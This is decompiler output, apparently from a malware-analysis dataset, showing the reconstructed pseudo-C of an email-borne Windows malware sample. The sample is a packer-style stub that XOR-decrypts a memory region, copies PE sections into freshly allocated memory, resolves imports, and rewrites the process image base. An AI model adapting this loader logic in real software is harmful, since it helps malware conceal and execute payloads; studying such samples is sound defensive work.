/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_0491/ia32_pe/subject.exe'
 */

/*	Procedure: 0x00401020 - 0x00401039
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

__entry_point__()
{



    ebx = 0x40103a;
    *(ebx + L0040114D())();
    L004010DA();
    return(L00401210());
}

/*	Procedure: 0x0040103A - 0x0040103F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040103A()
{



    return(L00401160());
}

/*	Procedure: 0x00401040 - 0x00401089
 *	Argument size: -4
 *	Local size: 4
 *	Save regs size: 0
 */

L00401040()
{
	/* unknown */ void  Vfffffffc;



    (save) & Vfffffffc;
    (save)4;
    ecx = *L00407074;
    (save)ecx;
    *L00402000 = ecx;
    *L00402008 = 4223112;
    (save)4223112;
    *__imp__VirtualProtect();
    return(L0040108A( *L00402008, *L00402000));
}

/*	Procedure: 0x0040108A - 0x004010CE
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L0040108A(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    ecx = 24;
    edx = 125;
    esi = A8 + Ac;
    for(ebx = 217 + L0040114D(); 1; L004010CF()) {
        *A8 = *A8 ^ bl;
        bl = bl + 250;
        L004010CF();
        *A8 = *A8 ^ cl;
        cl = cl + 13;
        L004010CF();
        *A8 = *A8 ^ dl;
        dl = dl + 209;
    }
}

/* DEST BLOCK NOT FOUND: 004010d8 -> 004010cb */
/*	Procedure: 0x004010CF - 0x004010D9
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004010CF()
{



    if(edi + 1 != esi) {
        return;
    }
    esp = esp + 4;
    goto L004010cb;
}

/*	Procedure: 0x004010DA - 0x0040114C
 *	Argument size: -16
 *	Local size: 20
 *	Save regs size: 0
 */

L004010DA(A30)
/* unknown */ void  A30;
{
	/* unknown */ void  Vfffffffc;



    ebx = *L00402008 + *( *L00402008 + 60);
    *L00402120 = *(ebx + 52);
    Vfffffffc = *(ebx + 6) & 255;
    (save)64;
    (save)12288;
    (save) *(ebx + 80);
    (save) *(ebx + 52);
    esi = *__imp__VirtualAlloc();
    L00401168(esi, *L00402008, *(ebx + 84));
    edi = ebx + 248;
    do {
        eax = *L00402008 + *(edi + 20);
        L00401168(esi + *(edi + 12), eax, *(edi + 16));
        edi = edi + 40;
    } while(Vfffffffc = Vfffffffc - 1);
    eax = *(ebx + 40) + esi;
    A30 = eax;
    return(A30);
}

/*	Procedure: 0x0040114D - 0x0040115F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040114D()
{



    *__imp__GetProcessTimes();
    return(*__imp__GetLastError());
}

/*	Procedure: 0x00401160 - 0x00401167
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401160()
{



    (save)0;
    *__imp__ExitProcess();
}

/*	Procedure: 0x00401168 - 0x0040118A
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 12
 */

L00401168(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    eax = Ac;
    edx = A8;
    ecx = A10;
    if(ecx != 0) {
        do {
            *edx = *eax;
            eax = eax + 1;
            edx = edx + 1;
        } while(ecx = ecx - 1);
    }
}

/*	Procedure: 0x0040118B - 0x004011FB
 *	Argument size: -4
 *	Local size: 4
 *	Save regs size: 0
 */

L0040118B()
{
	/* unknown */ void  Vfffffffc;



    esi = *L00402120;
    ebx = *( *(esi + 60) + esi + 128) + esi;
    do {
        (save) *(ebx + 12) + *L00402120;
        Vfffffffc = *__imp__LoadLibraryA();
        esi = *ebx + *L00402120;
        edi = *(ebx + 16) + *L00402120;
        do {
            *edi = *__imp__GetProcAddress(Vfffffffc, *esi + *L00402120 + 2);
            edi = edi + 4;
            esi = esi + 4;
        } while(*esi != 0);
        ebx = ebx + 20;
    } while(*(ebx + 12) != 0);
    return(0);
}

/*	Procedure: 0x004011FC - 0x0040120F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004011FC()
{



    *( *( *%fs:0x18] + 48) + 8) = *L00402120;
}

/*	Procedure: 0x00401210 - 0x0040121A
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401210()
{



    L0040118B();
    return(L004011FC());
}

/*	Procedure: 0x0040121B - 0x0040121B
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040121B()
{



    asm("int3");
}

/* address  size  */
/* 0x00401000       0 */ /* unknown */ void 	__imp__GetLastError;
/* 0x00401004       0 */ /* unknown */ void 	__imp__GetProcAddress;
/* 0x00401008       0 */ /* unknown */ void 	__imp__GetProcessTimes;
/* 0x0040100c       0 */ /* unknown */ void 	__imp__LoadLibraryA;
/* 0x00401010       0 */ /* unknown */ void 	__imp__VirtualAlloc;
/* 0x00401014       0 */ /* unknown */ void 	__imp__VirtualProtect;
/* 0x00401018       0 */ /* unknown */ void 	__imp__ExitProcess;
/* 0x00401020       0 */ /* unknown */ void 	__entry_point__;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
